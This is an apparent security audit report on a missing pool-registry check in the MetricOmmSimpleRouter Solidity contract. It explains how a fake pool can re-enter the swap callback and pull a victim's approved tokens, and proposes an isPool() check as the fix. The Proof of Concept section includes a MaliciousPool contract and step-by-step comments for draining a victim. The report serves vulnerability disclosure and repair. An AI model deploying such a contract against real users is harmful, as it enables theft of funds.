### Title
Unverified Pool Addresses in `MetricOmmSimpleRouter` Allow Malicious Pool to Steal User Funds via Swap Callback — (`metric-periphery/contracts/MetricOmmSimpleRouter.sol`)

---

### Summary

`MetricOmmSimpleRouter` calls arbitrary pool addresses supplied by the caller in `exactInput`, `exactOutput`, `exactInputSingle`, and `exactOutputSingle` without verifying that those addresses were deployed by the canonical `MetricOmmPoolFactory`. A malicious pool contract can exploit the router's own `metricOmmSwapCallback` to drain tokens from the user's wallet up to their ERC-20 approval limit.

---

### Finding Description

`_validatePath` — the only path-level guard in the router — performs exclusively structural checks (array lengths and pool count): [1](#0-0) 

It never calls `IMetricOmmPoolFactory.isPool()` or any equivalent registry check. As a result, any address can be placed in `params.pools[]`.

Inside `exactInput`, the router iterates over the caller-supplied pool array and, for each hop, (1) writes the pool address as the *expected* callback caller into transient storage, then (2) calls `pool.swap(...)` on that address: [2](#0-1) 

Because the malicious pool was just registered as the expected callback caller, it passes `_requireExpectedCallbackCaller`: [3](#0-2) 

The malicious pool's `swap` implementation then immediately re-enters the router via `metricOmmSwapCallback`, supplying crafted `amount0Delta`/`amount1Delta` values. The router's `_justPayCallback` unconditionally transfers tokens from the stored payer (the victim user for hop 0) to `msg.sender` (the malicious pool): [4](#0-3) 

The factory does expose `isPool()`: [5](#0-4) 

but the router never calls it. The same unverified call pattern exists in `exactInputSingle` (line 72), `exactOutputSingle` (line 136), and the recursive `_exactOutputIterateCallback` (line 220). [6](#0-5) 

---

### Impact Explanation

A user who calls `exactInput` (or any of the other three entry points) with a malicious pool in the path loses up to their full ERC-20 approval to the router. For hop 0 the payer is `msg.sender` (the victim); the malicious pool controls the delta values and can set them to `type(int128).max`, causing the router to pull the maximum approvable amount from the victim's wallet and send it to the malicious pool. No funds remain in the router after the call; the loss is direct and immediate. This matches the **direct loss of user principal** impact gate.

---

### Likelihood Explanation

- Pool paths are always constructed by front-end applications and encoded as address arrays; users do not inspect them manually.
- The router is a trusted, well-known contract; users may have it allowlisted in their wallet UI.
- A single compromised or malicious front-end is sufficient to inject the exploit pool into the path.
- No privileged role, no special token, and no prior pool state is required — any EOA can deploy the malicious pool and craft the path.

---

### Recommendation

Add a factory-registry check inside `_validatePath` (or at the call site) for every pool address before calling `swap`:

```solidity
// metric-periphery/contracts/MetricOmmSimpleRouter.sol

function _validatePath(
    address[] calldata tokens,
    address[] calldata pools,
    bytes[] calldata extensionDatas
) internal view {          // <-- change pure → view
    if (
        tokens.length < 2 ||
        pools.length != tokens.length - 1 ||
        extensionDatas.length != pools.length ||
        pools.length > MAX_PATH_POOLS
    ) revert InvalidPath();

    for (uint256 i = 0; i < pools.length; i++) {
+       if (!IMetricOmmPoolFactory(factory).isPool(pools[i]))
+           revert UnregisteredPool(pools[i]);
    }
}
```

Apply the same guard to `exactInputSingle` and `exactOutputSingle` before calling `pool.swap`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.35;

import {IMetricOmmSwapCallback} from "@metric-core/interfaces/callbacks/IMetricOmmSwapCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IMetricOmmSimpleRouter} from "metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol";

contract MaliciousPool {
    address public immutable token;
    address public immutable victim;

    constructor(address _token, address _victim) {
        token = _token;
        victim = _victim;
    }

    // Called by the router during exactInput
    function swap(
        address, bool, int128, uint128, bytes calldata, bytes calldata
    ) external returns (int128, int128) {
        // Re-enter the router's callback as the registered expected caller.
        // Report a large positive amount0Delta so the router pulls tokens from the victim.
        IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(
            type(int128).max,   // positive → router pays this amount of token0 to us
            0,
            ""
        );
        return (type(int128).max, 0);
    }
}

// In the test:
// 1. Deploy MaliciousPool(tokenIn, victim).
// 2. victim approves router for a large amount of tokenIn.
// 3. Call router.exactInput({
//        tokens: [tokenIn, tokenOut],
//        pools:  [address(maliciousPool)],   // ← injected
//        ...
//    }) from any address (e.g. attacker front-end tricking victim).
// 4. Router sets maliciousPool as expected callback caller, calls maliciousPool.swap().
// 5. maliciousPool calls metricOmmSwapCallback(int128.max, 0, "").
// 6. Router's _justPayCallback pulls int128.max of tokenIn from victim → maliciousPool.
// 7. Victim loses funds; maliciousPool holds them.
```

### Citations

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L46-62)
```text
  function metricOmmSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {
    if (amount0Delta <= 0 && amount1Delta <= 0) revert InvalidSwapDeltas();

    _requireExpectedCallbackCaller(msg.sender);

    uint8 callbackMode = _getCallbackMode();

    if (callbackMode == CALLBACK_MODE_JUST_PAY) {
      _justPayCallback(amount0Delta, amount1Delta);
      return;
    }
    if (callbackMode == CALLBACK_MODE_EXACT_OUTPUT_ITERATE) {
      _exactOutputIterateCallback(amount0Delta, amount1Delta, data);
      return;
    }
    revert InvalidCallbackMode(callbackMode);
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L99-112)
```text
    for (uint256 i = 0; i <= last; i++) {
      address pool = params.pools[i];
      bool zeroForOne = MetricOmmSwapPath.resolveZeroForOneBitmap(params.zeroForOneBitMap, i);

      _setNextCallbackContext(pool, CALLBACK_MODE_JUST_PAY, i == 0 ? msg.sender : address(this), params.tokens[i]);
      (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(pool)
        .swap(
          i == last ? params.recipient : address(this),
          zeroForOne,
          amount,
          MetricOmmSwapPath.openLimit(zeroForOne),
          "",
          params.extensionDatas[i]
        );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L235-245)
```text
  function _validatePath(address[] calldata tokens, address[] calldata pools, bytes[] calldata extensionDatas)
    internal
    pure
  {
    if (
      tokens.length < 2 || pools.length != tokens.length - 1 || extensionDatas.length != pools.length
        || pools.length > MAX_PATH_POOLS
    ) {
      revert InvalidPath();
    }
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L149-151)
```text
  function isPool(address pool) external view override returns (bool) {
    return poolToIdx[pool] != 0;
  }
```
